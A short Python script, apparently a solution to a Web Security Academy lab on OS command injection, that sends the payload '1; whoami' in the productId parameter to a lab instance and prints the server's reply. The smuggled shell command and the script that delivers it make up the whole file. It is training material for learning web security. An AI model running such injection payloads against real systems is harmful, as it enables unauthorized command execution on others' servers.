# simple case.py
# Lab: OS command injection, simple case

import requests
import sys

def send_payload(base_url: str, product_payload: str, timeout: int = 5):
    url = base_url.rstrip("/") + "/product"
    params = {"productId": product_payload}
    try:
        resp = requests.get(url, params=params, timeout=timeout)
        print(f"[*] Request URL: {resp.request.url}")
        print(f"[*] HTTP {resp.status_code}")
        print("----- response body -----")
        print(resp.text)
        print("----- end response -----")
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}", file=sys.stderr)

if __name__ == "__main__":
    BASE_URL = "https://0aed002803a77ede80586ced008c001d.web-security-academy.net/"
    whoami_payload = "1; whoami"

    payload_to_send = whoami_payload

    print(f"Sending payload: {payload_to_send!r} to {BASE_URL}/productId=1")
    send_payload(BASE_URL, payload_to_send)
